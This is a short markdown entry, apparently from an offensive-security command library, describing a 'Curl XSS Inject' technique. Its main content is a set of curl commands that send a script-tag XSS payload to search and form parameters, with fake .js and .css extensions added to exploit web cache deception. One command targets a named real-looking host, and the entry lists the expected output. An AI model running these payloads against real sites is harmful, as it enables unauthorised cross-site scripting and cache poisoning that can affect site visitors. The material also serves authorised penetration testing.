---
data: >-
  curl
  "https://target.algolia.com/search?query=<script>alert('XSS')</script>/fake.js"
tags:
  - web
  - xss
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 07778dac-6a66-438d-984c-e848670eef13
created_at: '2025-12-13T09:00:34.253Z'
updated_at: '2025-12-13T09:00:34.253Z'
verified: false
validated: true
submitted: true
---
# Curl XSS Inject

## Command

```bash
curl "https://target.algolia.com/search?query=<script>alert('XSS')</script>/fake.js"
```

## Description

This command injects an XSS payload into a URL parameter while appending a fake extension to exploit cache deception.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Target URL with payload and fake extension | Yes |

## Examples

### Basic Usage

```bash
curl "https://target.com/search?query=<script>alert(1)</script>/fake.js"
```

### Advanced Usage

```bash
curl -X POST "https://target.com/form?input=<script>alert(1)</script>/fake.css"
```

## Expected Output

The server response body reflecting the XSS payload, potentially cached.

## Related
- [[procedures/Inject-XSS-Payload-via-Cache-Manipulation]]
